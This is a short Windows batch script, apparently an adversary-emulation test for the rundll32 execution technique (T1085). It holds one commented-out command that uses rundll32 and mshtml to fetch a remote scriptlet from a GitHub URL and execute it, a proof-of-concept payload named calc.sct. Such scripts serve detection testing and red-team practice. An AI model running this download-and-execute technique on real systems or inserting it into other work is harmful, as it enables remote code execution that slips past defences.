@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Suspicious Executions using Rundll32 (T1085)
ECHO.
ECHO [+] Use 'RUNDLL32' to Execute payloads
ECHO -------------------------------------------------------------------
::cmd /c rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/greycel/poc/master/calc.sct").Exec();
ECHO.
